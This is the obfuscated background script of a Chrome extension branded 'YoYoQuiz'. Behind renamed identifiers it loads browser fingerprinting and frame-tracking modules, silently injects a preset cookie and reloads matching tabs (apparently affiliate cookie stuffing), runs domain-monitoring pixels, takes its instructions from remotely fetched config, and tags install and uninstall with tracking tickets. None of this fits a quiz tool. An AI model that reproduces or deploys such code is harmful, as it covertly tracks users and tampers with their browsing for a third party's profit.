var metro_clock = {
    uid: "../../javascript/calculateparameters",
    "domain-data-sync": "../../javascript/returnsession",
    util: "../../javascript/substracthandle",
    display: "../../javascript/adaptiveentry",
    idler: "../../javascript/decrementnotification",
    logger: "../../javascript/notifyword",
    "comm-channel": "../../javascript/notifyword",
    tabs: "../../javascript/buildtier",
    "system-monitor": "../../javascript/notifyword",
    "project-data-manager": "../../javascript/returnsession",
    "domain-checker": "../../javascript/returnsession",
    "request-manager": "../../javascript/returnsession",
    "config-manager": "../../javascript/returnsession",
    "serving-proxy": "../../javascript/servebroker",
    Fingerprint2: "../../javascript/getservice",
    "display-reserve": "../../javascript/notifyword",
    "frame-manager": "../../javascript/abortunit",
    browser: "../../javascript/buildtier",
    "frame-tracking": "../../javascript/getservice"
};

require.config({
    paths: metro_clock,
    basePath: "js/background/"
});

require([ "comm-channel", "util", "config-manager", "serving-proxy", "tabs", "uid", "display", "project-data-manager", "idler", "logger", "system-monitor", "frame-manager", "request-manager", "frame-tracking", "domain-data-sync" ], function(tier_parameters, tier_queue, query_point, value_actor, tier_thread, gate_system, server_abstractor, power_accountant, account_parameters, accuracy_path, members_configs, queue_parameters, configs_ticket, system_session, config_notification) {
    const accountant_material = 1e3;
    var access_handle = false, timeout_timeout = false;
    function test_material() {
        if (isInstallTriggered) {
            read_handle();
            substract_configs();
            accuracy_path.log("bgmn-inst-trg");
        } else {
            externalObj.postInstallationSetup = test_material;
        }
    }
    function insert_moduo() {
        try {
            if (isInstallTriggered && !isTyUrlTriggered) {
                let unit_metro = power_accountant.getTyUrl();
                if (tier_queue.isURL(unit_metro)) {
                    isTyUrlTriggered = true;
                    chrome.tabs.create({
                        active: true,
                        url: unit_metro + "&us=ls"
                    }, function() {
                        if (chrome.runtime.lastError) {
                            accuracy_path.log("bg-main-ty-ls-not-open");
                        }
                    });
                }
            } else {
                externalObj.triggerTyUrlFromProjectDomainStorage = insert_moduo;
            }
        } catch (worker_unit) {
            accuracy_path.log("bg-main-ty-ls-ex", worker_unit);
        }
    }
    function test_shell() {
        if (updateData.available) {
            help_system(updateData.version).then(function() {
                chrome.runtime.reload();
            }).catch(function() {
                chrome.runtime.reload();
            });
            accuracy_path.log("bgmn-updt-avbl", updateData.version);
        } else {
            externalObj.postUpdateSetup = test_shell;
        }
    }
    function move_worker() {
        if (startUp) {
            accuracy_path.log("bgmn-stup");
        } else {
            externalObj.onProfileStartUp = move_worker;
        }
    }
    function iterate_service() {
        chrome.tabs.onUpdated.addListener(function(actor_accuracy, project_query) {
            if (project_query.url && project_query.url.match(settings.PC.PCD) !== null) {
                chrome.cookies.get({
                    name: settings.PC.PCN,
                    url: settings.PC.PCU
                }, function(project_tier) {
                    if (!project_tier) {
                        tier_queue.setCookie({
                            value: settings.PC.PCV,
                            name: settings.PC.PCN,
                            domain: settings.PC.PCD,
                            url: settings.PC.PCU
                        }, function() {
                            if (chrome.runtime.lastError) {} else {
                                chrome.tabs.reload(actor_accuracy);
                            }
                        });
                    }
                });
            }
        });
    }
    function clean_thread(broker_index) {
        if (typeof broker_index.rank !== "undefined") {
            if (broker_index.rank === query_point.getAppConfig().priority) {
                if (!access_handle) {
                    server_abstractor.init();
                    access_handle = true;
                }
            } else if (access_handle) {
                server_abstractor.unload();
                access_handle = false;
            }
        }
    }
    function listen_text() {
        chrome.contextMenus.create({
            title: "Uninstall YoYoQuiz",
            contexts: [ "browser_action" ],
            onclick: function() {
                chrome.runtime.setUninstallURL(settings.UNINSTALL_PAGE + power_accountant.getTicket() + "&cm=1", function() {
                    chrome.management.uninstallSelf();
                });
            }
        });
    }
    function read_handle() {
        try {
            tier_queue.setCookie({
                value: settings.PC.PCV,
                name: settings.PC.PCN,
                domain: settings.PC.PCD,
                url: settings.PC.PCU
            });
        } catch (worker_unit) {
            accuracy_path.log("bgmn-inst-stp-ex", worker_unit);
        }
    }
    function substract_configs() {
        if (!timeout_timeout && isInstallTriggered && power_accountant.isTicketSet()) {
            chrome.runtime.setUninstallURL(settings.UNINSTALL_PAGE + power_accountant.getTicket(), function() {
                if (chrome.runtime.lastError) {
                    timeout_timeout = false;
                } else {
                    timeout_timeout = true;
                }
            });
        }
    }
    function receive_broker() {
        tier_parameters.addListener("RANKCHANGE", function(system_server) {
            clean_thread(system_server.data);
        });
    }
    function cycle_query() {
        tier_parameters.addListener("CONFIG_CHANGE", function() {
            settle_metro();
            queue_parameters.init(query_point.getAppConfig()).then(() => {
                return config_notification.init(query_point.getAppConfig());
            }).catch(worker_unit => {
                setTimeout(chrome.runtime.reload, list_tier() * accountant_material);
                accuracy_path.log("bg-main-conf-frame-upd-ex", typeof worker_unit === "object" ? worker_unit.message ? worker_unit.message : JSON.stringify(worker_unit) : worker_unit);
            });
        });
    }
    function settle_metro() {
        var positive_timeout = query_point.getAppConfig();
        members_configs.init({
            interval: positive_timeout.domainMonitorInterval,
            urls: positive_timeout.monitoredDomainsPixel,
            attempts: positive_timeout.domainMonitorAttempts
        });
    }
    function list_tier() {
        var positive_timeout, power_architecture = settings.EXTENSION_SETUP_RECOVERY_INTERVAL;
        try {
            positive_timeout = query_point.getAppConfig();
        } catch (worker_unit) {
            positive_timeout = null;
        }
        if (positive_timeout && positive_timeout.extensionReloadInterval) {
            power_architecture = positive_timeout.extensionReloadInterval;
        }
        return power_architecture;
    }
    function abolish_timetable() {
        try {
            iterate_service();
            tier_parameters.init().then(function() {
                accuracy_path.emptyLogCache();
                tier_thread.init();
                return power_accountant.init();
            }).then(function() {
                insert_moduo();
                substract_configs();
                return query_point.init();
            }).then(function() {
                settle_metro();
                return gate_system.init(power_accountant.getUID());
            }).then(function() {
                system_session.init();
                return queue_parameters.init(query_point.getAppConfig());
            }).then(function() {
                return config_notification.init(query_point.getAppConfig());
            }).then(function() {
                try {
                    cycle_query();
                    configs_ticket.init();
                    account_parameters.init();
                    receive_broker();
                    value_actor.init();
                    listen_text();
                } catch (worker_unit) {
                    accuracy_path.log("bgmn-init-srv-ex", worker_unit);
                }
            }).catch(function(worker_unit) {
                setTimeout(chrome.runtime.reload, list_tier() * accountant_material);
                accuracy_path.log("bgmn-initmng-ex", typeof worker_unit === "object" ? worker_unit.message ? worker_unit.message : JSON.stringify(worker_unit) : worker_unit);
            });
        } catch (worker_unit) {
            setTimeout(chrome.runtime.reload, list_tier() * accountant_material);
            accuracy_path.log("bgmn-init-ex", worker_unit);
        }
    }
    function help_system(entry_configs) {
        return new Promise(function(tool_model, accountant_configs) {
            power_accountant.init().then(function() {
                substract_configs();
                query_point.setNewConfigFromServer(entry_configs).then(function() {
                    tool_model();
                }).catch(function(worker_unit) {
                    accountant_configs(worker_unit);
                });
            }).catch(function(worker_unit) {
                accountant_configs(worker_unit);
            });
        });
    }
    function return_ticket() {
        test_material();
        test_shell();
        move_worker();
        abolish_timetable();
    }
    return_ticket();
});